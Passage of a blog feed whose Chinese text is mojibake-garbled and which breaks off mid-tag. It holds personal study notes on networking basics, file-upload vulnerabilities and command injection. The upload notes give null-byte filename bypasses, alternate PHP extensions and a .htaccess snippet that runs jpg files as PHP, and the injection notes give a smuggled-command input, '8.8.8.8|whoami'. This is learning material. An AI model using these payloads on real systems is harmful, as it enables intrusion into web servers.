title="0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚"></a>0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚</h3><p><strong>ç‚¹åˆ°ç‚¹ä¿¡é“çš„æ•°æ®é“¾è·¯å±‚</strong>ï¼ˆå¹¿åŸŸç½‘ï¼‰</p><p>PPPåè®®</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195355465.png" alt="image-20200615195355465"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615201603443.png" alt="image-20200615201603443"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195843590.png" alt="image-20200615195843590"></p><p><strong>å¹¿æ’­ä¿¡é“çš„æ•°æ®é“¾è·¯å±‚</strong>ï¼ˆé›†çº¿å™¨ï¼‰</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615205445679.png" alt="image-20200615205445679"></p><h3 id="0x04ä»¥å¤ªç½‘"><a href="#0x04ä»¥å¤ªç½‘" class="headerlink" title="0x04ä»¥å¤ªç½‘"></a>0x04ä»¥å¤ªç½‘</h3><p>ä»¥å¤ªç½‘æ˜¯ä¸€ç§CSMA/CDçš„å±€åŸŸç½‘</p><p><strong>åª’ä½“æ¥å…¥æ§åˆ¶å±‚</strong>ï¼ˆMAC ï¼‰</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211139871.png" alt="image-20200615211139871"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211817436.png" alt="image-20200615211817436"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615212131635.png" alt="image-20200615212131635"></p><p>FCSæŠ“åŒ…ä¹‹åä¼šåˆ æ‰ã€‚</p><h3 id="0x05æ‰©å±•ä»¥å¤ªç½‘"><a href="#0x05æ‰©å±•ä»¥å¤ªç½‘" class="headerlink" title="0x05æ‰©å±•ä»¥å¤ªç½‘"></a>0x05æ‰©å±•ä»¥å¤ªç½‘</h3><p>é›†çº¿å™¨çº§è”ï¼Œä¼šä½¿ç½‘ç»œä¸­è®¡ç®—æœºæ•°é‡å¢åŠ ï¼Œä½†ä¼šä½¿å†²çªåŸŸå¢å¤§ï¼Œå¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ</p><p><strong>ç½‘æ¡¥</strong><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615214530777.png" alt="image-20200615214530777"></p><p>ç½‘æ¡¥å°±æ˜¯äº¤æ¢æœºçš„å‰èº«ï¼Œäº¤æ¢æœºç›¸å½“äºç½‘æ¡¥å’Œé›†çº¿å™¨ã€‚</p><h3 id="0x06é«˜é€Ÿä»¥å¤ªç½‘"><a href="#0x06é«˜é€Ÿä»¥å¤ªç½‘" class="headerlink" title="0x06é«˜é€Ÿä»¥å¤ªç½‘"></a>0x06é«˜é€Ÿä»¥å¤ªç½‘</h3><h2 id="ç¬¬å››ç« -ç½‘ç»œå±‚"><a href="#ç¬¬å››ç« -ç½‘ç»œå±‚" class="headerlink" title="ç¬¬å››ç«  ç½‘ç»œå±‚"></a>ç¬¬å››ç«  ç½‘ç»œå±‚</h2><h3 id="0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡"><a href="#0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡" class="headerlink" title="0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡"></a>0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616110826298.png" alt="image-20200616110826298"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616111607056.png" alt="image-20200616111607056"></p><p>ï¼ˆè·¯ç”±å™¨æ˜¯ç½‘ç»œå±‚è®¾å¤‡ï¼‰</p><p>ç½‘ç»œåœ°å€ç›¸åŒå°±å¯ä»¥çœ‹æˆä¸€ä¸ª<strong>ç½‘æ®µ</strong>ï¼Œæ€ä¹ˆçœ‹ç½‘ç»œåœ°å€å‘¢ï¼Ÿå¯ä»¥çœ‹å­ç½‘æ©ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ip:10.0.0.1</span><br><span class="line">å­ç½‘æ©ç :255.0.0.0</span><br><span class="line">&#x2F;&#x2F;æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºå­ç½‘æ©ç æ˜¯255ï¼Œé‚£è¡¨æ˜ipåœ°å€ä¸­10å°±æ˜¯ç½‘ç»œåœ°å€ã€‚</span><br><span class="line"></span><br><span class="line">ip:12.0.0.1</span><br><span class="line">å­ç½‘æ©ç 255.255.0.0</span><br><span class="line">&#x2F;&#x2F;255.255.0.0è¯´æ˜åœ¨è¿™ä¸ªç½‘æ®µä¸­12.0æ˜¯ç½‘ç»œåœ°å€</span><br><span class="line"></span><br><span class="line">ç½‘å…³ï¼šè·¯ç”±å™¨ä¸Šé…ç½®ï¼Œä¸€èˆ¬ä¸ºè¯¥ç½‘æ®µä¸­çš„ç¬¬ä¸€ä¸ªåœ°å€ï¼Œå®é™…ä¸Šä»»æ„ä¸€ä¸ªåœ°å€éƒ½å¯ä»¥ã€‚</span><br><span class="line"></span><br><span class="line">è·¯ç”±å™¨ï¼šè·¯ç”±å™¨æ˜¯æ— æ³•çŸ¥é“å®ƒå…·ä½“ç½‘æ®µçš„ä½ç½®ï¼Œéœ€è¦æ·»åŠ è·¯ç”±è¡¨ã€‚</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616114228562.png" alt="image-20200616114228562"></p><h3 id="0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹"><a href="#0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹" class="headerlink" title="0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹"></a>0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹</h3><p>å‘é€ç«¯ï¼š</p><ol><li><p>åº”ç”¨å±‚ ç¨‹åºå‡†å¤‡è¦ä¼ è¾“çš„æ–‡ä»¶</p></li><li><p>ä¼ è¾“å±‚ å°†æ–‡ä»¶ç¼–å·</p></li><li><p>ç½‘ç»œå±‚ æ·»åŠ IPåœ°å€</p></li><li><p>æ•°æ®é“¾è·¯å±‚  æœ‰ä¸¤ç§æƒ…å†µ </p><p>ç¬¬ä¸€ç§ é€šè¿‡å­ç½‘æ©ç  ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯åŒä¸€ä¸ªç½‘æ®µã€‚å¦‚æœæ˜¯ï¼Œåˆ©ç”¨ARPåè®®å¹¿æ’­è§£æç›®æ ‡ipåœ°å€çš„MACåœ°å€</p><p>ç¬¬äºŒç§</p></li></ol><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617112108377.png" alt="image-20200617112108377"></p><h3 id="0x03ç½‘ç»œå±‚åè®®"><a href="#0x03ç½‘ç»œå±‚åè®®" class="headerlink" title="0x03ç½‘ç»œå±‚åè®®"></a>0x03ç½‘ç»œå±‚åè®®</h3><h4 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a><strong>ARPåè®®</strong></h4><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617113421057.png" alt="image-20200617113421057"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp -a  &#x2F;&#x2F;æŸ¥è¯¢macåœ°å€</span><br><span class="line">arp -s ipåœ°å€ macåœ°å€   &#x2F;&#x2F;é…ç½®IPåœ°å€çš„MACåœ°å€</span><br></pre></td></tr></table></figure><p>arpåè®®:å°†ipåœ°å€é€šè¿‡å¹¿æ’­ ç›®æ ‡MACåœ°å€æ˜¯FF-FF-FF-FF-FF-FF<strong>è§£æç›®æ ‡ipåœ°å€çš„MACåœ°å€</strong></p><p>arpæ¬ºéª—: æ•°æ®é“¾è·¯å±‚æ•…éšœï¼Œç¼“å­˜äº†é”™è¯¯çš„MACåœ°å€</p><h4 id="ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰"><a href="#ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰" class="headerlink" title="ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰"></a><strong>ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®</strong>ï¼ˆICMPï¼‰</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ping      ttl&#x3D;64 linux</span><br><span class="line">128 windows</span><br><span class="line">255 unix</span><br><span class="line">ping www.baidu.com -t    ä¸€ç›´ping</span><br><span class="line">ping www.baidu.com -l 200   å®šä¹‰æ•°æ®åŒ…çš„å¤§å°</span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹è·¯ç”±å™¨çš„åœ°å€</span><br><span class="line">ping 8.8.8.8 -i 1 æ›´æ”¹æ•°æ®åŒ…ttlæ—¶é—´ï¼Œå¯ä»¥è·Ÿè¸ªé€”ç»çš„è·¯ç”±å™¨</span><br><span class="line">pathping   è·Ÿè¸ªpingçš„è·¯å¾„</span><br><span class="line">tracert    ç›´æ¥è·Ÿè¸ªè·¯ç”±</span><br></pre></td></tr></table></figure><h4 id="IGMP"><a href="#IGMP" class="headerlink" title="IGMP"></a>IGMP</h4><p>é…ç½®åœ¨è·¯ç”±å™¨ä¸Šæ‰«æå¤šæ’­åœ°å€çš„åè®®</p><p>å¹¿æ’­ï¼šç›®æ ‡ipåœ°å€æ˜¯å…¨ffï¼Œç›®æ ‡macåœ°å€æ˜¯255ï¼Œå‘å±€åŸŸç½‘å†…æ‰€æœ‰è®¡ç®—æœºå‘å‡ºå¹¿æ’­</p><p>ç‚¹åˆ°ç‚¹ï¼šä»ä¸€ä¸ªç‚¹åˆ°å¦ä¸€ä¸ªç‚¹</p><p>ç»„æ’­ï¼šä¸€å¯¹å¤š</p><h3 id="0x04æ•°æ®åŒ…"><a href="#0x04æ•°æ®åŒ…" class="headerlink" title="0x04æ•°æ®åŒ…"></a>0x04æ•°æ®åŒ…</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111139014.png" alt="image-20200619111139014"></p><p>ç‰ˆæœ¬ï¼šç”¨æ¥è¡¨ç¤ºTCP/IPåè®®çš„ç‰ˆæœ¬ v4 v6</p><p>åŒºåˆ†æœåŠ¡ï¼šçœ‹è°çš„ä¼˜å…ˆçº§é«˜</p><p>æ ‡è¯†ï¼š100 100 100å°±ä¸ºä¸€ä¸ªæ•°æ®åŒ…</p><p>æ ‡å¿—ï¼šçœ‹æ•°æ®åŒ…æ˜¯å¦åˆ†ç‰‡<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619112943227.png" alt="image-20200619112943227"></p><p>ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰ï¼šæ¯è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œç”Ÿå­˜æ—¶é—´ä¼šä¿®æ”¹ã€‚</p><p>åè®®å·ï¼šäº¤ç»™å“ªä¸ªåè®®è¿›è¡Œå¤„ç†</p><p>ï¼ˆICMP 1      IGMP  2       TCP  6        UDP  17  IPv6   41       OSPF   89ï¼‰</p><p>æ•°æ®é“¾è·¯å±‚æ”¯æŒæ•°æ®åŒ…1500å­—èŠ‚</p><p>IPå±‚æ”¯æŒæ•°æ®åŒ…æ˜¯65535å­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦åˆ†ç‰‡ä¼ è¾“ï¼Œä½†ä¸€èˆ¬ä¸ä¼šè¶…è¿‡1500å­—èŠ‚ã€‚</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111512690.png" alt="image-20200619111512690"></p><h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090006669.png" alt="image-20200807090006669"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090512480.png" alt="image-20200807090512480"></p><p><strong>Active Mode</strong></p><p>ç¬¬äºŒä¿¡é“æ˜¯æœåŠ¡å™¨ä¸»åŠ¨å‘èµ·çš„ã€‚</p><p>ç¬¬ä¸€ä¿¡é“æ˜¯21ç«¯å£</p><p>ç¬¬äºŒä¿¡é“æ˜¯20ç«¯å£</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100649933.png" alt="image-20200807100649933"></p><p><strong>Passive</strong></p><p>ç¬¬ä¸€ä¿¡é“æ˜¯21ç«¯å£</p><p>ç¬¬äºŒä¿¡é“æ˜¯éšæœºç«¯å£</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100800469.png" alt="image-20200807100800469"></p><h1 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807145634367.png" alt="image-20200807145634367"></p><p><strong>telnet</strong>çš„ç«¯å£æ˜¯23ç«¯å£</p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200811154248708.png" alt="image-20200811154248708"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ä¸ªåªæœ‰è¿™ä¸€éƒ¨åˆ†äº†&lt;/p&gt;
&lt;p&gt;åé¢å­¦äº†ä½†å¥½åƒä¸¢äº†&lt;/p&gt;
&lt;p&gt;çœ‹å¤šä¼šå­¦åˆ°è®¡ç½‘æ—¶ï¼Œå†æ¥è¡¥è¿™ä¸€ç¯‡&lt;/p&gt;
&lt;h1 id=&quot;è®¡ç½‘åˆå­¦&quot;&gt;&lt;a href=&quot;#è®¡ç½‘åˆå­¦&quot; class=&quot;headerlink&quot; title=&quot;è®¡ç½‘åˆå­¦&quot;&gt;&lt;/a&gt;è®¡ç½‘åˆå­¦&lt;/h1&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="è®¡ç½‘" scheme="https://pz1o.top/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="è®¡ç½‘" scheme="https://pz1o.top/tags/%E8%AE%A1%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <link href="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-12-09T15:26:33.000Z</published>
    <updated>2020-12-09T15:27:06.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸Šä¼ æ¼æ´"><a href="#ä¸Šä¼ æ¼æ´" class="headerlink" title="ä¸Šä¼ æ¼æ´"></a>ä¸Šä¼ æ¼æ´</h1><p><a href="https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener">https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/</a></p><h2 id="0x01åŸºæœ¬æµç¨‹"><a href="#0x01åŸºæœ¬æµç¨‹" class="headerlink" title="0x01åŸºæœ¬æµç¨‹"></a>0x01åŸºæœ¬æµç¨‹</h2><ol><li>å›¾ç‰‡æ˜¯å¦æ­£å¸¸ä¸Šä¼ ã€‚</li><li>å›¾ç‰‡ä¸Šä¼ å†…å®¹æ˜¯å¦è¢«æ„ŸæŸ“ã€‚ï¼ˆå†…å®¹æ›¿æ¢ æŠ“åŒ…æ”¹ï¼‰</li><li>ä¸Šä¼ çš„åŸŸåæ˜¯å¦æ˜¯ç›®æ ‡æœåŠ¡å™¨ã€‚</li><li>ä¸Šä¼ çš„ç›®å½•æ˜¯å¦æ”¯æŒè§£æ</li></ol><h2 id="0x02ç»•è¿‡js"><a href="#0x02ç»•è¿‡js" class="headerlink" title="0x02ç»•è¿‡js"></a>0x02ç»•è¿‡js</h2><h2 id="0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚"><a href="#0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚" class="headerlink" title="0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚"></a>0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚</h2><p>æŠ“åŒ…çš„æ—¶å€™ %00</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.jpg%00.php</span><br><span class="line">1.php%00.jpg</span><br></pre></td></tr></table></figure><h2 id="0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯"><a href="#0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯" class="headerlink" title="0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯"></a>0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯</h2><p>é»‘åå•ï¼šä¸å…è®¸ä»€ä¹ˆä¸Šä¼ </p><p>ç™½åå•ï¼šå…è®¸ä»€ä¹ˆä¸Šä¼ </p><p>å¯ä»¥å°è¯•php3 php4 php5 phtmlï¼Œphtä½¿ç”¨  æˆ–æœåŠ¡å™¨è§£ææ¼æ´</p><h2 id="0x05äºŒæ¬¡ä¸Šä¼ "><a href="#0x05äºŒæ¬¡ä¸Šä¼ " class="headerlink" title="0x05äºŒæ¬¡ä¸Šä¼ "></a>0x05äºŒæ¬¡ä¸Šä¼ </h2><h2 id="0x06MIME"><a href="#0x06MIME" class="headerlink" title="0x06MIME"></a>0x06MIME</h2><p>content-typeä¸­è¡¨ç¤ºäº†æ–‡ä»¶ç±»å‹ã€‚</p><h2 id="0x07è§£ææ¼æ´"><a href="#0x07è§£ææ¼æ´" class="headerlink" title="0x07è§£ææ¼æ´"></a>0x07è§£ææ¼æ´</h2><h3 id="iisè§£ææ¼æ´"><a href="#iisè§£ææ¼æ´" class="headerlink" title="iisè§£ææ¼æ´"></a>iisè§£ææ¼æ´</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609194945742.png" alt="image-20200609194945742"></p><h3 id="apacheè§£ææ¼æ´"><a href="#apacheè§£ææ¼æ´" class="headerlink" title="apacheè§£ææ¼æ´"></a>apacheè§£ææ¼æ´</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195122633.png" alt="image-20200609195122633"></p><h3 id="nginxè§£ææ¼æ´"><a href="#nginxè§£ææ¼æ´" class="headerlink" title="nginxè§£ææ¼æ´"></a>nginxè§£ææ¼æ´</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195540127.png" alt="image-20200609195540127"></p><h3 id="netä¸Šä¼ "><a href="#netä¸Šä¼ " class="headerlink" title=".netä¸Šä¼ "></a>.netä¸Šä¼ </h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609200056116.png" alt="image-20200609200056116"></p><h3 id="phtmlä¸Šä¼ "><a href="#phtmlä¸Šä¼ " class="headerlink" title="phtmlä¸Šä¼ "></a>phtmlä¸Šä¼ </h3><p>åœ¨apacheé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ï¼ˆhttpd.confï¼‰ä¸­æ·»åŠ </p><p>AddType application/x-httpd-php.phtml</p><p>è¿™æ ·phtmlåç¼€çš„æ–‡ä»¶å°±ä¼šæŒ‰ç…§phpå»è§£æ</p><h3 id="htaccessä¸Šä¼ "><a href="#htaccessä¸Šä¼ " class="headerlink" title=".htaccessä¸Šä¼ "></a>.htaccessä¸Šä¼ </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType:application&#x2F;x-httpd-php</span><br><span class="line">SetHandler:application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.jpg</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;ä¼šå°†æ‰€æœ‰çš„jpgæ–‡ä»¶éƒ½æŒ‰ç…§phpæ¥è§£æ</span><br></pre></td></tr></table></figure><h2 id="0x08åŒæ–‡ä»¶ä¸Šä¼ "><a href="#0x08åŒæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x08åŒæ–‡ä»¶ä¸Šä¼ "></a>0x08åŒæ–‡ä»¶ä¸Šä¼ </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¸Šä¼ æ¼æ´&quot;&gt;&lt;a href=&quot;#ä¸Šä¼ æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ä¸Šä¼ æ¼æ´&quot;&gt;&lt;/a&gt;ä¸Šä¼ æ¼æ´&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶åŒ…å«</title>
    <link href="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-12-09T15:21:27.000Z</published>
    <updated>2020-12-09T15:23:42.040Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©åœ¨æ•´ç†ç¡¬ç›˜çš„ä¸€äº›ä¸œè¥¿ï¼Œæœ‰äº›webå­¦çš„ä¸œè¥¿åˆä¸æƒ³æ‰”ï¼Œå°±ä¼ ä¸Šæ¥ã€‚</p><h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="0x01å®šä¹‰"><a href="#0x01å®šä¹‰" class="headerlink" title="0x01å®šä¹‰"></a>0x01å®šä¹‰</h2><p>åœ¨é€šè¿‡æœåŠ¡å™¨è„šæœ¬çš„å‡½æ•°å¼•å…¥æ–‡ä»¶æ—¶ï¼Œç”±äºä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„æ ¡éªŒï¼Œä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„éœ²ç”šè‡³æ¶æ„çš„ä»£ç æ³¨å…¥ã€‚</p><h2 id="0x02ç¯å¢ƒè¦æ±‚"><a href="#0x02ç¯å¢ƒè¦æ±‚" class="headerlink" title="0x02ç¯å¢ƒè¦æ±‚"></a>0x02ç¯å¢ƒè¦æ±‚</h2><ul><li>allow_url_fopen=On(é»˜è®¤ä¸ºOn) è§„å®šæ˜¯å¦å…è®¸ä»è¿œç¨‹æœåŠ¡å™¨æˆ–è€…ç½‘ç«™æ£€ç´¢æ•°æ®</li><li>allow_url_include=On(php5.2ä¹‹åé»˜è®¤ä¸ºOff) è§„å®šæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶</li></ul><h2 id="0x03æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#0x03æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="0x03æ–‡ä»¶åŒ…å«å‡½æ•°"></a>0x03æ–‡ä»¶åŒ…å«å‡½æ•°</h2><ul><li>include():å¯è·å¾—æŒ‡å®šæ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡æœ¬ï¼Œå¹¶æŠŠæ–‡æœ¬æ‹·è´åˆ°ä½¿ç”¨ include å‡½æ•°çš„æ–‡ä»¶ä¸­ã€‚include() å‡½æ•°<strong>ä¼šç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼Œä½†æ˜¯è„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚</strong></li><li>require():å‡½æ•°æ¥å—çš„æ‰€æœ‰æ–‡æœ¬æ–‡ä»¶,å¹¶å°†å®ƒå¤åˆ¶åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨äº†åŒ…æ‹¬åŠŸèƒ½ã€‚å¦‚æœåœ¨åŠ è½½ä¸€ä¸ªæ–‡ä»¶æ—¶æœ‰ä»»ä½•é—®é¢˜ï¼Œ<strong>ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯,åœæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚</strong></li></ul><h2 id="0x04å‘½ä»¤æ‰§è¡Œ"><a href="#0x04å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="0x04å‘½ä»¤æ‰§è¡Œ"></a>0x04å‘½ä»¤æ‰§è¡Œ</h2><p><a href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21</a></p><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>åº”ç”¨æœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚PHPä¸­çš„systemã€execã€shell_execã€</p><p>passthruã€popenã€proc_popenç­‰ï¼Œå½“ç”¨æˆ·èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„ç³»ç»Ÿå‘½ä»¤</p><p>æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ï¼Œè¿™å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li><p>åº”ç”¨è°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°</p></li><li><p>å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°äº†å‘½ä»¤è¡Œä¸­</p></li><li><p>æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥</p></li></ul><hr><h3 id="å¸¸ç”¨è¿æ¥ç¬¦"><a href="#å¸¸ç”¨è¿æ¥ç¬¦" class="headerlink" title="å¸¸ç”¨è¿æ¥ç¬¦"></a>å¸¸ç”¨è¿æ¥ç¬¦</h3><ul><li>åœ¨Windowså’ŒLinuxä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>&amp;æ¥æ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚</strong></li><li><strong>|</strong>ï¼šå‰é¢å‘½ä»¤è¾“å‡ºç»“æœä½œä¸ºåé¢å‘½ä»¤çš„è¾“å…¥å†…å®¹ï¼›è¾“å…¥8.8.8.8|whoami </li><li><strong>||</strong>ï¼šå‰é¢å‘½ä»¤æ‰§è¡Œå¤±è´¥çš„æ—¶å€™æ‰æ‰§è¡Œåé¢çš„å‘½ä»¤</li><li><strong>&amp;&amp;</strong>ï¼šå‰é¢å‘½ä»¤æ‰§è¡ŒæˆåŠŸäº†æ‰æ‰§è¡Œåé¢çš„å‘½ä»¤</li><li>åœ¨Linuxä¸­è¿˜å¯ä»¥ç”¨ï¼›å·æ¥è¿æ¥ã€‚</li></ul><h3 id="å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" 